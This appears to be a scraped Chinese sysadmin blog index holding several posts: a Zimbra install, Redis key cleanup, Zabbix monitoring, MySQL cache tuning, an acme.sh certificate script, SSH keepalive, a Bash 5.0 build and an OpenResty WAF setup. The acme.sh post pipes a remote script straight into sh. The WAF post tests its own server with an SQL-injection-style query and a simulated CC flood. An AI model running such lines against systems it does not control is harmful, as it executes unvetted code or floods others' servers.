tarball官方下载页面： Zimbra Collaboration Suite download page 填写基本信息，产品选择：Zimbra Collaboration – Open Source Edition ，之后便跳转到了下载页面，选择平台CentOS7, 点击x64_86 开始下载 123456789#下载wget https://files.zimbra.com/downloads/8.8.15_GA/zcs-8.8.15_GA_3869.RHEL7_64.20190918004220.tgz#解压tar -zxf zcs-8.8.15_GA_3869.RHEL7_64.20190918004220.tgz#安装Zimbracd zcs-8.8.15_GA_3869.RHEL7_64.20190918004220./install.sh 1234567891011121314#它首先会检查以前是否安装过zimbra,然后提示你是否同意EULA的条款，输入“y” 来接受许可证。----------------------------------------------------------------------PLEASE READ THIS AGREEMENT CAREFULLY BEFORE USING THE SOFTWARE.SYNACOR, INC. (&quot;SYNACOR&quot;) WILL ONLY LICENSE THIS SOFTWARE TO YOU IF YOUFIRST ACCEPT THE TERMS OF THIS AGREEMENT. BY DOWNLOADING OR INSTALLINGTHE SOFTWARE, OR USING THE PRODUCT, YOU ARE CONSENTING TO BE BOUND BYTHIS AGREEMENT. IF YOU DO NOT AGREE TO ALL OF THE TERMS OF THISAGREEMENT, THEN DO NOT DOWNLOAD, INSTALL OR USE THE PRODUCT.License Terms for this Zimbra Collaboration Suite Software:https://www.zimbra.com/license/zimbra-public-eula-2-6.html----------------------------------------------------------------------Do you agree with the terms of the software license agreement? [N] y 1234567891011#接下来会提示你是否使用zimbra软件包存储库..Use Zimbra&#x27;s package repository [Y] yImporting Zimbra GPG keyConfiguring package repositoryChecking for installable packages...#输入Enter键继续安装zimbra 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152...Select the packages to installInstall zimbra-ldap [Y] yInstall zimbra-logger [Y] yInstall zimbra-mta [Y] yInstall zimbra-dnscache [Y] yInstall zimbra-snmp [Y] yInstall zimbra-store [Y] yInstall zimbra-apache [Y] yInstall zimbra-spell [Y] yInstall zimbra-memcached [Y] yInstall zimbra-proxy [Y] yInstall zimbra-drive [Y] yInstall zimbra-imapd (BETA - for evaluation only) [N] Install zimbra-chat [Y] yChecking required space for zimbra-coreChecking space for zimbra-storeChecking required packages for zimbra-storezimbra-store package check complete.Installing: zimbra-core zimbra-ldap zimbra-logger zimbra-mta zimbra-dnscache zimbra-snmp zimbra-store zimbra-apache zimbra-spell zimbra-memcached zimbra-proxy zimbra-drive zimbra-patch zimbra-mta-patch zimbra-proxy-patch zimbra-chat...#之后系统会提示你是否允许修改系统来安装这些组件，输入“y”,然后按Enter键继续。 12345678# 如果遇到DNS错误，只需要修改域名并继续...DNS ERROR resolving MX for zimbra.domain.comIt is suggested that the domain name have an MX record configured in DNSChange domain name? [Yes] yesCreate domain: [zimbra.domain.com] domain.com... 1234567891011121314151617# 下面通过选择 “选项7”来修改Admin密码...Main menu 1) Common Configuration: 2) zimbra-ldap: Enabled 3) zimbra-logger: Enabled 4) zimbra-mta: Enabled 5) zimbra-dnscache: Enabled 6) zimbra-snmp: Enabled 7) zimbra-store: Enabled +Create Admin User: yes +Admin user to create: admin@domain.com ******* +Admin Password UNSET ......Address unconfigured (**) items (? - help) 7 123456789101112#通过选项4，可以设置自己的密码，当然也可以保留默认值...Store configuration 1) Status: Enabled 2) Create Admin User: yes 3) Admin user to create: admin@domain.com ** 4) Admin Password UNSET Select, or &#x27;r&#x27; for previous menu [r] 4Password for admin@domain.com (min 6 characters): [sIyXczeI6] MyStrongP 返回上一个菜单并应用更改并继续进行zimbra配置 123456789101112131415161718192021222324252627...Select, or &#x27;r&#x27; for previous menu [r] rMain menu 1) Common Configuration: 2) zimbra-ldap: Enabled 3) zimbra-logger: Enabled 4) zimbra-mta: Enabled 5) zimbra-dnscache: Enabled 6) zimbra-snmp: Enabled 7) zimbra-store: Enabled 8) zimbra-spell: Enabled 9) zimbra-proxy: Enabled 10) Default Class of Service Configuration: s) Save config to file x) Expand menu q) Quit *** CONFIGURATION COMPLETE - press &#x27;a&#x27; to applySelect from menu, or press &#x27;a&#x27; to apply config (? - help) aSave configuration data to a file? [Yes] yesSave config in file: [/opt/zimbra/config.18030] Saving config in /opt/zimbra/config.18030...done.The system will be modified - continue? [No] yes... 安装完成后，系统会提示你是否生成安装日志，输入[Yes] 四、访问Access Zimbra Web UI123456#Zimbra管理控制台https://zimbra.domain.com:7071 账号：admin 密码：你上面设置的密码#Zimbra客户端https://zimbra.domain.com Zimbra现在已安装并可以运行。 现在，您可以通过安装合法的SSL / TLS证书，添加和管理帐户以及其他任务来开始使用。 五、卸载12cd zcs-8.8.15_GA_3869.RHEL7_64.20190918004220./install.sh -u 六、zimbra邮件管理参考：Awakenedy","categories":[],"tags":[{"name":"mail","slug":"mail","permalink":"https://garywu520.github.io/tags/mail/"},{"name":"zimbra","slug":"zimbra","permalink":"https://garywu520.github.io/tags/zimbra/"},{"name":"邮件服务器","slug":"邮件服务器","permalink":"https://garywu520.github.io/tags/%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"ZCS","slug":"ZCS","permalink":"https://garywu520.github.io/tags/ZCS/"}]},{"title":"redis key批量清理","slug":"redis-key批量清理","date":"2019-10-29T08:04:32.000Z","updated":"2019-10-29T08:06:32.039Z","comments":true,"path":"2019/10/29/redis-key批量清理/","link":"","permalink":"https://garywu520.github.io/2019/10/29/redis-key%E6%89%B9%E9%87%8F%E6%B8%85%E7%90%86/","excerpt":"","text":"获取key到文件 1redis-cli -h 127.0.0.1 -p 6379 -a &quot;password&quot; keys kline_* &gt;/root/keys.log 删除key 1234while read LINEdo redis-cli -h 127.0.0.1 -p 6379 -a &quot;password&quot; del $LINEdone &lt; /root/keys.log","categories":[],"tags":[{"name":"redis key清理","slug":"redis-key清理","permalink":"https://garywu520.github.io/tags/redis-key%E6%B8%85%E7%90%86/"},{"name":"key","slug":"key","permalink":"https://garywu520.github.io/tags/key/"},{"name":"清理","slug":"清理","permalink":"https://garywu520.github.io/tags/%E6%B8%85%E7%90%86/"}]},{"title":"zabbix server监控zabbix agent存活","slug":"zabbix-server监控zabbix-agent存活","date":"2019-10-29T07:34:00.000Z","updated":"2019-10-29T08:01:12.270Z","comments":true,"path":"2019/10/29/zabbix-server监控zabbix-agent存活/","link":"","permalink":"https://garywu520.github.io/2019/10/29/zabbix-server%E7%9B%91%E6%8E%A7zabbix-agent%E5%AD%98%E6%B4%BB/","excerpt":"正常逻辑 如果按照正常部署方式，一般是创建zabbix-agent模板，通过net.tcp.listen[port] 或 自定义key，触发器≠1就告警，最后将模板应用到所有agent主机。","text":"正常逻辑 如果按照正常部署方式，一般是创建zabbix-agent模板，通过net.tcp.listen[port] 或 自定义key，触发器≠1就告警，最后将模板应用到所有agent主机。 实际情况 如果你细心点就会发现，当某台机器的zabbix-agent 服务stop后，监控数据就取不到了，紧接着就是zabbix断图，此时，触发器≠1由于没有获取到任何值而不会触发告警，所以也就监控不到某个机器的zabbix agent服务何时异常退出或机器宕机，这看起来是很严重的问题。 解决思路 在zabbix server端的模板中，通过配置 net.tcp.listen[ip,port] 简单检查，来获取不同agent的运行状态。 缺点：由于每台机器的IP地址都不相同，故每台机器都需要添加一个监控项+触发器，对于上百台机器来说，这是很繁琐的工作。至于用什么方法简化自己繁琐的工作，这是一个脑力活儿","categories":[],"tags":[{"name":"监控","slug":"监控","permalink":"https://garywu520.github.io/tags/%E7%9B%91%E6%8E%A7/"},{"name":"zabbix server","slug":"zabbix-server","permalink":"https://garywu520.github.io/tags/zabbix-server/"},{"name":"zabbix agent","slug":"zabbix-agent","permalink":"https://garywu520.github.io/tags/zabbix-agent/"}]},{"title":"MySQL缓存参数优化","slug":"MySQL两个核心参数优化","date":"2019-10-24T09:38:36.000Z","updated":"2019-10-24T09:41:56.056Z","comments":true,"path":"2019/10/24/MySQL两个核心参数优化/","link":"","permalink":"https://garywu520.github.io/2019/10/24/MySQL%E4%B8%A4%E4%B8%AA%E6%A0%B8%E5%BF%83%E5%8F%82%E6%95%B0%E4%BC%98%E5%8C%96/","excerpt":"表缓存与查询缓存 1. 表缓存MySQL table_open_cache优化 12345678910mysql&gt; set global table_open_cache &#x3D; 3072; Query OK, 0 rows affected (0.00 sec)mysql&gt; show global variables like &#39;table_open_cache&#39;;+------------------+-------+| Variable_name | Value |+------------------+-------+| table_open_cache | 3072 |+------------------+-------+1 row in set (0.01 sec)","text":"表缓存与查询缓存 1. 表缓存MySQL table_open_cache优化 12345678910mysql&gt; set global table_open_cache &#x3D; 3072; Query OK, 0 rows affected (0.00 sec)mysql&gt; show global variables like &#39;table_open_cache&#39;;+------------------+-------+| Variable_name | Value |+------------------+-------+| table_open_cache | 3072 |+------------------+-------+1 row in set (0.01 sec) 12345678mysql&gt; show global status like &#39;open%tables%&#39;;+---------------+-------+| Variable_name | Value |+---------------+-------+| Open_tables | 132 || Opened_tables | 139 |+---------------+-------+2 rows in set (0.00 sec) 配置文件修改【永久生效】 12[mysqld]table_open_cache = 3072 Open_tables会根据table_open_cache的限制进行表缓存，当open_tables等于table_open_cache的时候，open_tables会清理较早时间的表缓存来为新缓存腾出空间，一直反复，在此过程中，mysql的这个操作会消耗一定的系统内存和cpu资源。所以有必要对table_open_cache进行适当优化。 注：table_open_cache务必要小于open_file_limit的值，否则可能出现客户端由于文件描述符不足而连接失败，对应unix系统的ulimit值。 2. 查询缓存1234567891011121314mysql&gt; show variables like &#39;%query_cache%&#39;;+------------------------------+---------+| Variable_name | Value |+------------------------------+---------+| have_query_cache | YES || query_cache_limit | 1048576 || query_cache_min_res_unit | 4096 || query_cache_size | 1048576 || query_cache_type | OFF || query_cache_wlock_invalidate | ON |+------------------------------+---------+mysql&gt; set global query_cache_type &#x3D; 1;ERROR 1651 (HY000): Query cache is disabled; restart the server with query_cache_type&#x3D;1 to enable it 参数释义： have_query_cache YES 表示数据库支持查询缓存功能[不代表已开启查询缓存] query_cache_type: ON 表示启用查询缓存 query_cache_limit表示单条查询缓存的最大值，默认1M query_cache_min_res_unit 表示缓存内存的最小单元，默认4k query_cache_wlock_invalidate: 表示查询语句所查询的表如果被写锁锁定，是否仍然使用缓存返回结果。OFF表示使用缓存返回结果，ON表示关闭此功能。我们来描述一个场景：因为写锁是独占的，排他的，所以当写锁施加在对应表上的时候，如果对当前表发起查询请求，那么查询操作则需要等到写锁释放后才能进行。可是如果对于的查询语句正好命中了这张表的缓存，查询请求是否就不用继续等待写锁释放而直接从缓存中获取结果？默认值是OFF，也就是说当值为OFF时，即使表被施加了写锁，查询语句如果命中了对于的缓存，则会直接从缓存获取结果。换句话说，如果此值设置为ON，如果表被施加了写锁，那么当写锁释放时，数据可能发生了改变，所以在表被施加写锁期间，即使有查询命中了查询缓存，也不能从缓存获取结果。那么我们可以得出结论：当值设置为ON时，更加安全，保证了数据的一致性。 查询缓存：参考: 朱双印博客","categories":[],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://garywu520.github.io/tags/MySQL/"},{"name":"表缓存","slug":"表缓存","permalink":"https://garywu520.github.io/tags/%E8%A1%A8%E7%BC%93%E5%AD%98/"},{"name":"查询缓存","slug":"查询缓存","permalink":"https://garywu520.github.io/tags/%E6%9F%A5%E8%AF%A2%E7%BC%93%E5%AD%98/"},{"name":"table_open_cache","slug":"table-open-cache","permalink":"https://garywu520.github.io/tags/table-open-cache/"},{"name":"query_cache","slug":"query-cache","permalink":"https://garywu520.github.io/tags/query-cache/"}]},{"title":"免费SSL证书-申请更新脚本","slug":"免费SSL证书-申请更新脚本","date":"2019-10-16T03:18:55.000Z","updated":"2019-11-14T05:42:59.819Z","comments":true,"path":"2019/10/16/免费SSL证书-申请更新脚本/","link":"","permalink":"https://garywu520.github.io/2019/10/16/%E5%85%8D%E8%B4%B9SSL%E8%AF%81%E4%B9%A6-%E7%94%B3%E8%AF%B7%E6%9B%B4%E6%96%B0%E8%84%9A%E6%9C%AC/","excerpt":"acme.sh 实现了 acme 协议, 可以从 letsencrypt 生成免费的证书 环境：Nginx 一、安装acme.sh1234567curl https://get.acme.sh | sh#把 acme.sh 安装到root目录下~/.acme.sh/#并创建 一个 bash 的 alias, 方便你的使用alias acme.sh=~/.acme.sh/acme.sh 安装过程不会污染已有的系统任何功能和文件, 所有的修改都限制在安装目录中: ~/.acme.sh/","text":"acme.sh 实现了 acme 协议, 可以从 letsencrypt 生成免费的证书 环境：Nginx 一、安装acme.sh1234567curl https://get.acme.sh | sh#把 acme.sh 安装到root目录下~/.acme.sh/#并创建 一个 bash 的 alias, 方便你的使用alias acme.sh=~/.acme.sh/acme.sh 安装过程不会污染已有的系统任何功能和文件, 所有的修改都限制在安装目录中: ~/.acme.sh/ 二、SSL证书自动更新脚本注：此脚本与2019/11/15更新，生成ECC 384bit公钥，公钥参数：ECDSA_P384 123456789101112131415161718192021222324252627282930#!/bin/bash#自动更新SSL证书,crontab每30天强制更新一次DIR=/root/.acme.shSSLDIR=/etc/nginx/sslDOMAIN=xx.xx.net#强制更新证书cd $DIR if [ -f dhparam.pem ];then rm -f ./dhparam.pemfi#更新acme.sh到最新版./acme.sh --upgrade#生成ECDSA V3版的新key和cer#强制更新证书并指定nginx Root根目录[自动添加验证文件]./acme.sh --keylength ec-384 --issue --force -d $DOMAIN --webroot /usr/share/nginxsleep 2openssl dhparam -dsaparam -out dhparam.pem 4096#拷贝新证书覆盖ssl目录\\cp $DIR/$DOMAIN_ecc/$DOMAIN.cer $SSLDIR/\\cp $DIR/$DOMAIN_ecc/$DOMAIN.key $SSLDIR/\\cp $DIR/$DOMAIN_ecc/fullchain.cer $SSLDIR/\\cp $DIR/dhparam.pem $SSLDIR/#重启nginx服务/bin/systemctl restart nginx nginx.conf 1234567891011121314151617181920#由于证书是ECC 384bit，故需要更新ssl_ciphers参数#HTTP2特性已启用，启用方法googleserver &#123; listen 443 ssl http2; server_name xx.xx.com; keepalive_timeout 70; charset ISO-88509-1; ssl_stapling on; ssl_stapling_verify on; ssl_session_cache shared:SSL:10m; ssl_session_timeout 10m; ssl_protocols TLSv1.2; ssl_prefer_server_ciphers on; ssl_certificate /etc/nginx/ssl/xx.xx.com.cer; ssl_certificate_key /etc/nginx/ssl/xx.xx.com.key; ssl_trusted_certificate /etc/nginx/ssl/fullchain.cer; ssl_dhparam /etc/nginx/ssl/dhparam.pem; ssl_ciphers &quot;ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384&quot;;&#125; GitHub: 项目地址","categories":[],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://garywu520.github.io/tags/Nginx/"},{"name":"SSL","slug":"SSL","permalink":"https://garywu520.github.io/tags/SSL/"},{"name":"crt","slug":"crt","permalink":"https://garywu520.github.io/tags/crt/"},{"name":"pem","slug":"pem","permalink":"https://garywu520.github.io/tags/pem/"},{"name":"key","slug":"key","permalink":"https://garywu520.github.io/tags/key/"},{"name":"证书","slug":"证书","permalink":"https://garywu520.github.io/tags/%E8%AF%81%E4%B9%A6/"},{"name":"acme.sh","slug":"acme-sh","permalink":"https://garywu520.github.io/tags/acme-sh/"},{"name":"dhparam.pem","slug":"dhparam-pem","permalink":"https://garywu520.github.io/tags/dhparam-pem/"},{"name":"letsencrypt","slug":"letsencrypt","permalink":"https://garywu520.github.io/tags/letsencrypt/"}]},{"title":"SSH保持长连接","slug":"SSH保持长连接","date":"2019-10-15T03:18:18.000Z","updated":"2019-10-15T03:30:26.257Z","comments":true,"path":"2019/10/15/SSH保持长连接/","link":"","permalink":"https://garywu520.github.io/2019/10/15/SSH%E4%BF%9D%E6%8C%81%E9%95%BF%E8%BF%9E%E6%8E%A5/","excerpt":"场景：跳板机从阿里云北京到阿里云其他地方，过一会儿总出现无响应的问题。 方案一：服务端配置1234vim /etc/ssh/sshd_config #添加如下两行ClientAliveInterval 60ClientAliveCountMax 1 SSH Server 每 60 秒就会自动发送一个信号给 Client，而等待 Client 回应， 如果客户端没有回应，会记录下来直到记录数超过 ClientAliveCountMax 的值时，才会断开连接。","text":"场景：跳板机从阿里云北京到阿里云其他地方，过一会儿总出现无响应的问题。 方案一：服务端配置1234vim /etc/ssh/sshd_config #添加如下两行ClientAliveInterval 60ClientAliveCountMax 1 SSH Server 每 60 秒就会自动发送一个信号给 Client，而等待 Client 回应， 如果客户端没有回应，会记录下来直到记录数超过 ClientAliveCountMax 的值时，才会断开连接。 方案二：客户端配置如果由于某些原因，不能控制服务器，也可以在客户端实现 1234vim /etc/ssh/ssh_config #注意：这里的文件是ssh_configTCPKeepAlive yesServerAliveInterval 30 参数： TCPKeepAlive yes 开启TCP保持连接 ServerAliveInterval 30 每过30秒发一个数据包到服务器证明“我还活着”","categories":[],"tags":[{"name":"SSH","slug":"SSH","permalink":"https://garywu520.github.io/tags/SSH/"},{"name":"Keepalive","slug":"Keepalive","permalink":"https://garywu520.github.io/tags/Keepalive/"},{"name":"sshd","slug":"sshd","permalink":"https://garywu520.github.io/tags/sshd/"}]},{"title":"Bash 5.0编译","slug":"Bash-5-0编译","date":"2019-10-14T07:34:29.000Z","updated":"2019-10-14T09:49:28.879Z","comments":true,"path":"2019/10/14/Bash-5-0编译/","link":"","permalink":"https://garywu520.github.io/2019/10/14/Bash-5-0%E7%BC%96%E8%AF%91/","excerpt":"CentOS7安装的Bash版本是 V4.2.46，而Bash目前已经发不了5.0 Beta，编译玩玩 Bash: Download 一、编译安装Bash 5.012#安装C编译器,make程序,内核头文件yum install -y gcc make kernel-headers","text":"CentOS7安装的Bash版本是 V4.2.46，而Bash目前已经发不了5.0 Beta，编译玩玩 Bash: Download 一、编译安装Bash 5.012#安装C编译器,make程序,内核头文件yum install -y gcc make kernel-headers 123wget http://ftp.gnu.org/gnu/bash/bash-5.0-beta2.tar.gztar -zxf bash-5.0-beta2.tar.gzcd bash-5.0-beta2 12345./configure --prefix=/usr/local/bash5.0makemake testmake install/usr/local/bash5.0/bin/bash --version 二、使用新版本的Bash Shell12mv /bin/bashbug /bin/bashbug.bak &amp;&amp; ln -sv /usr/local/bash5.0/bin/bashbug /usr/bashbugmv /bin/bash /bin/bash.bak &amp;&amp; ln -sv /usr/local/bash5.0/bin/bash /bin/bash 1234567[root@localhost ~]# bash --versionGNU bash, version 5.0.0(1)-beta2 (x86_64-pc-linux-gnu)Copyright (C) 2018 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software; you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.","categories":[],"tags":[{"name":"bash","slug":"bash","permalink":"https://garywu520.github.io/tags/bash/"}]},{"title":"OpenResty+Lua实现WAF应用防火墙","slug":"OpenResty-Lua实现WAF应用防火墙","date":"2019-10-12T09:24:57.000Z","updated":"2019-10-12T09:30:23.633Z","comments":true,"path":"2019/10/12/OpenResty-Lua实现WAF应用防火墙/","link":"","permalink":"https://garywu520.github.io/2019/10/12/OpenResty-Lua%E5%AE%9E%E7%8E%B0WAF%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99/","excerpt":"一、OpenResty概览OpenResty是一个基于Lua扩展Nginx实现的可伸缩Web平台，其内部集成了大量精良的Lua库、第三方模块以及大多数依赖项。用于方便的部署能够处理超高并发、扩展性极高的动态Web应用。 OpenResty的目标是让你的Web服务直接跑在Nginx服务内部，充分利用Nginx的非阻塞I/O模型，不仅仅对HTTP客户端请求，甚至于对后端诸如MySQL、PostgreSQL、Memcache以及Redis等都进行一致的高性能响应。 二、安装依赖库 安装pcre依赖库 1234wget https://ftp.pcre.org/pub/pcre/pcre-8.43.tar.gztar -zxf pcre-8.43.tar.gzcd pcre-8.43./configure &amp;&amp; make &amp;&amp; make install 安装zlib依赖库 1yum install -y zlib zlib-devel 安装ssl依赖库 1yum install -y openssl openssl-devel","text":"一、OpenResty概览OpenResty是一个基于Lua扩展Nginx实现的可伸缩Web平台，其内部集成了大量精良的Lua库、第三方模块以及大多数依赖项。用于方便的部署能够处理超高并发、扩展性极高的动态Web应用。 OpenResty的目标是让你的Web服务直接跑在Nginx服务内部，充分利用Nginx的非阻塞I/O模型，不仅仅对HTTP客户端请求，甚至于对后端诸如MySQL、PostgreSQL、Memcache以及Redis等都进行一致的高性能响应。 二、安装依赖库 安装pcre依赖库 1234wget https://ftp.pcre.org/pub/pcre/pcre-8.43.tar.gztar -zxf pcre-8.43.tar.gzcd pcre-8.43./configure &amp;&amp; make &amp;&amp; make install 安装zlib依赖库 1yum install -y zlib zlib-devel 安装ssl依赖库 1yum install -y openssl openssl-devel 安装Lua组件 [ 想使用Lua实现WAF功能 ] 123456789#下载最新LuaJITwget http://luajit.org/download/LuaJIT-2.0.5.tar.gztar -zxf LuaJIT-2.0.5.tar.gzcd LuaJIT-2.0.5make &amp;&amp; make installexport LUAJIT_LIB=/usr/local/libexport LUAJIT_INC=/usr/local/include/luajit-2.0ln -s /usr/local/lib/libluajit-5.1.so.2 /lib64/libluajit-5.1.so.2ldconfig 三、编译安装OpenResty 官方各版本：下载地址 123456789101112131415161718192021222324wget https://openresty.org/download/openresty-1.11.2.5.tar.gztar -zxf openresty-1.11.2.5.tar.gzcd openresty-1.11.2.5#创建www用户useradd -s /sbin/nologin -M www#编译openresty./configure --prefix=/usr/local/openresty \\--user=www \\--group=www \\--with-luajit \\--with-http_v2_module \\--with-http_stub_status_module \\--with-http_ssl_module \\--with-http_gzip_static_module \\--with-ipv6 --with-http_sub_module \\--with-pcre \\--with-pcre-jit \\--with-file-aio \\--with-http_dav_module#安装gmake &amp;&amp; gmake install 测试openresty 12345678#创建nginx配置文件存放目录mkdir -p /usr/local/openresty/nginx/conf/conf.d# vim /usr/local/openresty/nginx/conf/nginx.confhttp &#123; ...... include /usr/local/openresty/nginx/conf/conf.d/*.conf;&#125; vim /usr/local/openresty/nginx/conf/conf.d/hello.conf 12345678server &#123; location /hello &#123; default_type text/html; content_by_lua_block &#123; ngx.say(&quot;HelloWorld&quot;) &#125; &#125;&#125; 启动Nginx 12/usr/local/openresty/nginx/sbin/nginx -t/usr/local/openresty/nginx/sbin/nginx web访问测试 12curl -XGET http://192.168.1.186/helloHelloWorld Systemd管理Nginx启动 1ln -sv /usr/local/openresty/nginx/sbin/nginx /usr/sbin/ vim /etc/systemd/system/nginx.service 123456789101112131415[Unit]Description=The NGINX HTTP and reverse proxy serverAfter=syslog.target network.target remote-fs.target nss-lookup.target[Service]Type=forkingPIDFile=/usr/local/openresty/nginx/logs/nginx.pidExecStartPre=/usr/sbin/nginx -tExecStart=/usr/sbin/nginxExecReload=/usr/sbin/nginx -s reloadExecStop=/bin/kill -s QUIT $MAINPIDPrivateTmp=true[Install]WantedBy=multi-user.target 12systemctl enable nginxsystemctl start nginx 四、部署WAF功能参考：赵班长的 https://github.com/unixhot/waf 12345678910git clone https://github.com/unixhot/waf.gitcp -a ./waf/waf /usr/local/openresty/nginx/conf/[root@local waf]# ls -lh /usr/local/openresty/nginx/conf/waf/total 20K-rw-r--r--. 1 root root 408 Sep 24 23:17 access.lua-rw-r--r--. 1 root root 1.3K Sep 24 23:17 config.lua-rw-r--r--. 1 root root 5.4K Sep 24 23:17 init.lua-rw-r--r--. 1 root root 2.3K Sep 24 23:17 lib.luadrwxr-xr-x. 2 root root 158 Sep 24 23:17 rule-config 把WAF整合到Nginx中 12cat /usr/local/openresty/nginx/conf/nginx.conf #放到http区段，注意路径 12345678910http &#123; ...... #WAF lua_shared_dict limit 50m; lua_package_path &quot;/usr/local/openresty/nginx/conf/waf/?.lua&quot;; init_by_lua_file &quot;/usr/local/openresty/nginx/conf/waf/init.lua&quot;; access_by_lua_file &quot;/usr/local/openresty/nginx/conf/waf/access.lua&quot;; ...... include /usr/local/openresty/nginx/conf/conf.d/*.conf;&#125; 12nginx -tnginx -s reload 五、WAF模块waf安装好以后，不要直接上生产，而是先记录日志，不做任何动作。确定WAF不产生误杀。 config.lua配置模块 123456#pwd/usr/local/openresty/nginx/conf/waf#创建waf日志目录mkdir /tmp/waf_logschown -R www:www /tmp/waf_logs config.lua 配置文件说明 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758--WAF config file,enable = &quot;on&quot;,disable = &quot;off&quot;--是否开启配置WAFconfig_waf_enable = &quot;on&quot; --waf log dirconfig_log_dir = &quot;/tmp/waf_logs&quot; --rule settingconfig_rule_dir = &quot;/usr/local/openresty/nginx/conf/waf/rule-config&quot;--enable/disable white url 是否开启URL检测config_white_url_check = &quot;on&quot;--enable/disable white ip 是否开启IP白名单检测config_white_ip_check = &quot;on&quot;--enable/disable block ip 是否开启IP黑名单检测config_black_ip_check = &quot;on&quot;--enable/disable url filtering 是否开启URL过滤config_url_check = &quot;on&quot;--enalbe/disable url args filtering 是否开启参数检测config_url_args_check = &quot;on&quot;--enable/disable user agent filtering 是否开启UA检测config_user_agent_check = &quot;on&quot;--enable/disable cookie deny filtering 是否开启cookie检测config_cookie_check = &quot;on&quot;--enable/disable cc filtering 是否开启防cc攻击config_cc_check = &quot;on&quot;--cc rate the xxx of xxx seconds 允许一个IP 60秒内只能访问10次config_cc_rate = &quot;10/60&quot;--enable/disable post filtering 是否开启post检测config_post_check = &quot;on&quot;--config waf output redirect/html action一个html页面，也可以选择跳转config_waf_output = &quot;html&quot;--if config_waf_output ,setting urlconfig_waf_redirect_url = &quot;https://globtc.io&quot;config_output_html=[[&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;meta http-equiv=&quot;Content-Language&quot; content=&quot;zh-cn&quot; /&gt;&lt;title&gt;FBI&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=&quot;center&quot;&gt;异常操作已被捕捉，请规范上网行为&lt;/body&gt;&lt;/html&gt;]] access.lua 规则模块 12[root@local waf]# pwd/usr/local/openresty/nginx/conf/waf 12345678910111213141516171819[root@local waf]# cat access.lua require &#x27;init&#x27;function waf_main() if white_ip_check() then elseif black_ip_check() then elseif user_agent_attack_check() then elseif cc_attack_check() then elseif cookie_attack_check() then elseif white_url_check() then elseif url_attack_check() then elseif url_args_attack_check() then --elseif post_attack_check() then else return endendwaf_main() 1234567检测顺序：-- 先检查白名单，通过即不检测；再检查黑名单，不通过即拒绝;-- 检查UA，UA不通过即拒绝；-- 检查cookie；-- URL检查;-- URL参数检查;-- post检查； 六、WAF功能验证 ① 模拟SQL注入1234567891011[root@localhost conf]# curl http://192.168.1.186/a.sql&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;meta http-equiv=&quot;Content-Language&quot; content=&quot;zh-cn&quot; /&gt;&lt;title&gt;FBI&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=&quot;center&quot;&gt;异常操作已被捕捉，请规范上网行为&lt;/body&gt;&lt;/html&gt; ②使用ab压测工具模拟防cc攻击[未测试]12yum install -y httpd-toolsab -c 500 -n 10000 http://192.168.1.186/index.php ③模拟IP黑名单1echo &quot;192.168.1.8&quot; &gt;&gt;/usr/local/openresty/nginx/conf/waf/rule-config/blackip.rule 12345678[root@localhost ~]# curl http://192.168.1.186/a.sql&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;white&quot;&gt;&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;&lt;hr&gt;&lt;center&gt;openresty/1.11.2.5&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; ④模拟IP白名单12#白名单即允许某个IP无限制访问，由于a.sql本身不存在，故访问时正常情况下返回404echo &quot;192.168.1.8&quot; &gt;&gt;/usr/local/openresty/nginx/conf/waf/rule-config/whiteip.rule 12345678[root@localhost ~]# curl http://192.168.1.186/a.sql&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;white&quot;&gt;&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;&lt;hr&gt;&lt;center&gt;openresty/1.11.2.5&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; ⑤模拟URL参数检测123curl http://192.168.1.186/?a=select * from table或curl http://192.168.1.186/?a=select%20*%20from%20table 12345678910&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;meta http-equiv=&quot;Content-Language&quot; content=&quot;zh-cn&quot; /&gt;&lt;title&gt;FBI&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=&quot;center&quot;&gt;异常操作已被捕捉，请规范上网行为&lt;/body&gt;&lt;/html&gt; 注：URL请求规范 args.rule已有规范 cat /usr/local/openresty/nginx/conf/waf/rule-config/args.rule 